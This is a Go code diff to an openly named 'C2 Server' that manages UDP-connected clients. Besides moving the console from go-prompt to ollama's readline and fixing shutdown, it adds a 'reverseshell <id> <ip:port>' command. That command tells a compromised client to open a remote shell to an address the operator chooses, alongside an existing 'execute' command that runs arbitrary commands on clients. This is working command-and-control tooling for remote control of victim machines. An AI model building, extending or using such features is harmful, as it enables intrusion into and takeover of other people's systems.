@@ -4,14 +4,14 @@ import (
 	"bytes"
 	"encoding/gob"
 	"fmt"
+	"io"
 	"net"
-	"os"
 	"strings"
 	"sync"
 	"time"
 
 	"github.com/b1gcat/core/pki"
-	"github.com/c-bata/go-prompt"
+	"github.com/ollama/ollama/readline"
 	"github.com/sirupsen/logrus"
 )
 
@@ -87,16 +87,18 @@ func (s *Server) Start() error {
 	go s.udpListenLoop()
 
 	// Start console processing automatically
-	go s.StartConsole()
+	s.StartConsole()
 
-	// Server runs continuously, we'll exit directly via Stop()
-	select {}
+	return nil
 }
 
 // Stop terminates the server
 func (s *Server) Stop() {
-	// Exit directly as requested
-	os.Exit(0)
+	if s.conn != nil {
+		s.conn.Close()
+	}
+	// Close the console channel to stop console processing
+	close(s.consoleCh)
 }
 
 func (s *Server) udpListenLoop() {
@@ -109,6 +111,10 @@ func (s *Server) udpListenLoop() {
 		if err != nil {
 			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
 				continue
+			}
+			// Check if connection is closed
+			if strings.Contains(err.Error(), "use of closed network connection") {
+				return // Exit the loop when connection is closed
 			}
 			s.config.Logger.Errorf("server: failed to read from UDP: %v", err)
 			continue
@@ -256,61 +262,69 @@ func (s *Server) sendCommandToClient(identifier string, addr *net.UDPAddr, cmd s
 	s.config.Logger.Infof("server: sent command to %s: %s", identifier, cmd)
 }
 
+func (s *Server) sendReverseShellCommand(identifier string, targetAddr string) {
+	// Construct the reverse shell command
+	reverseShellCmd := "reverseshell:" + targetAddr
+
+	// Find the client address
+	s.clientsMu.RLock()
+	client, exists := s.clients[identifier]
+	if !exists {
+		fmt.Printf("Client %s not found\n", identifier)
+		s.clientsMu.RUnlock()
+		fmt.Print("> ")
+		return
+	}
+	addr := client.SourceIP.(*net.UDPAddr)
+	s.clientsMu.RUnlock()
+
+	s.sendCommandToClient(identifier, addr, reverseShellCmd)
+}
+
 func (s *Server) consoleLoop() {
 	fmt.Println("C2 Server Console")
 	fmt.Println("Type 'help' for available commands, type '?' to show command suggestions")
 
-	p := prompt.New(
-		func(in string) {
-			if in == "" {
-				return
-			}
-			// Handle ? command for showing suggestions
-			if in == "?" {
-				s.showHelp()
-				return
-			}
-			// Send command to processing channel
-			s.consoleCh <- in
-		},
-		func(d prompt.Document) []prompt.Suggest {
-			// Only show full command list when user types exactly "?"
-			if d.Text == "?" {
-				// Command suggestions
-				return []prompt.Suggest{
-					{Text: "help", Description: "Show help message"},
-					{Text: "show", Description: "Show all connected clients"},
-					{Text: "execute", Description: "Send command to client"},
-					{Text: "quit", Description: "Exit the server"},
-					{Text: "exit", Description: "Exit the server"},
-				}
-			}
+	// Create prompt
+	promptObj := readline.Prompt{
+		Prompt: "> ",
+	}
 
-			// Only show client IDs when completing execute command
-			if strings.HasPrefix(d.GetWordBeforeCursor(), "execute ") {
-				clientSuggests := []prompt.Suggest{}
-				s.clientsMu.RLock()
-				for id := range s.clients {
-					clientSuggests = append(clientSuggests, prompt.Suggest{Text: id})
-				}
-				s.clientsMu.RUnlock()
+	rl, err := readline.New(promptObj)
+	if err != nil {
+		s.config.Logger.Errorf("Failed to initialize readline: %v", err)
+		return
+	}
 
-				return clientSuggests
+	for {
+		line, err := rl.Readline()
+		if err != nil {
+			// Handle EOF or interrupt
+			if _, ok := err.(*readline.InterruptError); ok {
+				// Handle Ctrl+C
+				fmt.Println("\nReceived interrupt signal")
+				continue
+			} else if err == io.EOF {
+				// Handle Ctrl+D
+				break
 			}
+			s.config.Logger.Errorf("Readline error: %v", err)
+			continue
+		}
 
-			// No suggestions for other cases
-			return nil
-		},
-		prompt.OptionPrefix("> "),
-		prompt.OptionInputTextColor(prompt.Green),
-		prompt.OptionSuggestionTextColor(prompt.White),
-		prompt.OptionSelectedSuggestionTextColor(prompt.Black),
-		prompt.OptionSelectedSuggestionBGColor(prompt.LightGray),
-		prompt.OptionCompletionOnDown(), // Only show suggestions when pressing Tab or Down
-	)
+		in := strings.TrimSpace(line)
+		if in == "" {
+			continue
+		}
 
-	// Start the prompt
-	p.Run()
+		// Handle ? command for showing suggestions
+		if in == "?" {
+			s.showHelp()
+			continue
+		}
+		// Send command to processing channel
+		s.consoleCh <- in
+	}
 
 	// When prompt exits, stop the server directly
 	s.Stop()
@@ -350,6 +364,15 @@ func (s *Server) processConsoleCommand(input string) {
 		clientID := args[1]
 		cmd := strings.Join(args[2:], " ")
 		s.executeCommand(clientID, cmd)
+	case "reverseshell":
+		if len(args) < 3 {
+			fmt.Println("Usage: reverseshell <client-identifier> <ip:port>")
+			fmt.Print("> ")
+			return
+		}
+		clientID := args[1]
+		targetAddr := args[2]
+		s.sendReverseShellCommand(clientID, targetAddr)
 	case "quit", "exit":
 		s.Stop()
 		return
@@ -363,10 +386,11 @@ func (s *Server) processConsoleCommand(input string) {
 
 func (s *Server) showHelp() {
 	fmt.Println("Available commands:")
-	fmt.Println("  help                Show this help message")
-	fmt.Println("  show                Show all connected clients")
-	fmt.Println("  execute <id> <cmd>  Send command to client")
-	fmt.Println("  quit/exit           Exit the server")
+	fmt.Println("  help                           Show this help message")
+	fmt.Println("  show                           Show all connected clients")
+	fmt.Println("  execute <id> <cmd>             Send command to client")
+	fmt.Println("  reverseshell <id> <ip:port>    Send reverse shell command to client")
+	fmt.Println("  quit/exit                      Exit the server")
 }
 
 func (s *Server) showClients() {
